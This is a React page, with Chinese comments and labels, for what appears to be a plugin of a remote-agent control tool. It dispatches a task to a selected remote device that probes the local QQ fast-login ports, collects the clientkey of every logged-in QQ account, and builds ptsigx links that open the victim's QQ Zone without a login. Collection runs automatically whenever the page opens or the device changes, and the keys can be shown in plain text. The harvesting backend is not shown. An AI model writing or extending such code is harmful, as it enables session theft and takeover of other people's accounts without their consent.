import { useCallback, useEffect, useRef, useState } from 'react';
import { Button, Card, Chip, Spinner } from '@heroui/react';
import { usePluginHost } from '../../hooks/usePluginHost';

interface QQAccount {
  uin: string;
  nickname: string;
  clientkey: string;
  ptsigx: string;
}

interface QQKeyResult {
  accounts?: QQAccount[];
  error?: string;
}

/** QQ 头像（qlogo 支持 https，避免 https 页面出现 mixed-content 拦截）。 */
function avatarUrl(uin: string): string {
  return `https://q2.qlogo.cn/headimg_dl?dst_uin=${uin}&spec=100`;
}

function maskKey(key: string): string {
  if (!key) return '';
  if (key.length <= 8) return '*'.repeat(key.length);
  return key.slice(0, 4) + '*'.repeat(key.length - 8) + key.slice(-4);
}

/**
 * QQ ClientKey 探测插件页面。
 * 完全对齐 qq_ck_test.py：本地端口取全部已登录 QQ，每个 uin 取 clientkey，
 * jump 提取 ptsigx（QQ 空间免登 URL），不做 bkn/skey。
 * 打开页面自动采集一次，切换设备后也会自动重新采集。
 */
export default function QQKeyPage() {
  const { selectedAgent, dispatchTask } = usePluginHost();
  const [running, setRunning] = useState(false);
  const [result, setResult] = useState<QQKeyResult | null>(null);
  const [err, setErr] = useState<string | null>(null);
  const [showRaw, setShowRaw] = useState(false);
  const autoRanAgentRef = useRef<string | null>(null);

  const run = useCallback(async () => {
    if (!selectedAgent) return;
    setRunning(true);
    setErr(null);
    setShowRaw(false);
    try {
      const res = await dispatchTask('com.libra.qqkey', 'collect', {});
      setResult(res.result as QQKeyResult);
    } catch (e) {
      setErr(e instanceof Error ? e.message : '采集失败');
    } finally {
      setRunning(false);
    }
  }, [selectedAgent, dispatchTask]);

  // 打开页面自动采集；切换设备后自动重新采集。
  useEffect(() => {
    if (selectedAgent && autoRanAgentRef.current !== selectedAgent.id) {
      autoRanAgentRef.current = selectedAgent.id;
      run();
    }
  }, [selectedAgent, run]);

  const openQzone = (ptsigx: string) => {
    if (ptsigx) {
      window.open(ptsigx, '_blank', 'noopener');
    }
  };

  const accounts = result?.accounts ?? [];

  return (
    <div className="space-y-4">
      <Card className="p-6">
        <h1 className="text-xl font-semibold">QQ ClientKey 探测</h1>
        <p className="text-sm text-default-500 mt-1">
          探测本机 QQ 快速登录端口（4300-4310），列出已登录 QQ 并采集 clientkey，可跳转 QQ 空间免登链接。
        </p>
        <div className="mt-4 flex items-center gap-3">
          <Button variant="primary" isPending={running} isDisabled={!selectedAgent} onPress={run}>
            重新采集
          </Button>
          {!selectedAgent && <Chip size="sm" color="warning">请先在顶部选择设备</Chip>}
          {accounts.length > 0 && (
            <Button size="sm" variant="ghost" onPress={() => setShowRaw(s => !s)}>
              {showRaw ? '隐藏明文' : '显示明文'}
            </Button>
          )}
        </div>
      </Card>

      {err && <Card className="p-4 border border-danger"><p className="text-danger text-sm">{err}</p></Card>}

      {running && (
        <div className="flex items-center gap-2 text-default-500"><Spinner size="sm" /> 采集与兑换中…</div>
      )}

      {result && (
        <Card className="p-4">
          <div className="flex items-center gap-2 mb-3">
            <h2 className="font-semibold">已登录 QQ</h2>
            <Chip size="sm" variant="secondary">{accounts.length} 个</Chip>
          </div>

          {result.error ? (
            <p className="text-sm text-default-500">{result.error}</p>
          ) : accounts.length === 0 ? (
            <p className="text-sm text-default-500">未发现已登录 QQ（本机可能未运行 QQ 或未登录）。</p>
          ) : (
            <div className="space-y-2">
              {accounts.map((acc, i) => (
                <div key={`${acc.uin}-${i}`} className="flex items-center gap-3 rounded-lg border border-default-100 p-3">
                  <img
                    src={avatarUrl(acc.uin)}
                    alt={acc.nickname || acc.uin}
                    className="size-10 shrink-0 rounded-full object-cover bg-default-100"
                    onError={(e) => { (e.target as HTMLImageElement).style.visibility = 'hidden'; }}
                  />
                  <div className="min-w-0 flex-1">
                    <div className="flex items-center gap-2">
                      <span className="font-semibold truncate">{acc.nickname || '未知昵称'}</span>
                      <span className="font-mono text-xs text-default-500">{acc.uin}</span>
                    </div>
                    <div className="mt-0.5 font-mono text-xs text-default-500 break-all">
                      {acc.clientkey ? (showRaw ? acc.clientkey : maskKey(acc.clientkey)) : '未取到 clientkey'}
                    </div>
                  </div>
                  <Button
                    variant="primary"
                    size="sm"
                    isDisabled={!acc.ptsigx}
                    onPress={() => openQzone(acc.ptsigx)}
                  >
                    打开 QQ 空间
                  </Button>
                </div>
              ))}
            </div>
          )}
        </Card>
      )}
    </div>
  );
}
